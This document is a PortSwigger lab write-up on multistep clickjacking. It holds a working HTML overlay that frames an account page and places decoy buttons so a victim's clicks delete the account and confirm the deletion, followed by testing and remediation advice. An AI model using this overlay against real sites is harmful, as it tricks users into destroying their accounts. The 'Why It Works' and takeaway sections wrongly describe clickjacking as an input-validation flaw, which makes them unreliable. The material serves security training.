# Multistep clickjacking

create a iframe and above that make double click buttons.First one to hit delete account buton and second one to confirm it.

```html
<style>
	iframe {
		position:relative;
		width:800;
		height: 700;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aad006d0399b31182af74440091001a.web-security-academy.net/my-account"></iframe>
```

adjust position of click and deliver it to victim

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user "

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could trick users into performing actions they didn't intend (delete account, change email, transfer funds), capture keystrokes, trigger DOM-based XSS, or perform multi-step clickjacking attacks.

### Detection / Testing Methodology

1. Check if the target page can be framed (no X-Frame-Options or frame-ancestors CSP)
2. Verify if the page has JavaScript frame-busting (and test bypass via sandbox attribute)
3. Check if form fields can be pre-filled from URL parameters
4. Identify state-changing actions that could be clickjacked
5. Test if the page can be chained with DOM-based XSS

### Remediation

- Set X-Frame-Options: DENY or SAMEORIGIN
- Use CSP frame-ancestors 'none' or 'self'
- Do not rely on JavaScript frame-busting scripts (they can be bypassed)
- Implement both headers and JavaScript for defense-in-depth
- Do not allow form pre-filling from URL parameters for sensitive forms

### Key Takeaways

- This lab demonstrates a clickjacking vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab has some account functionality that is protected by a CSRF token and also has a confirmatio"
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Set X-Frame-Options: DENY or SAMEORIGIN
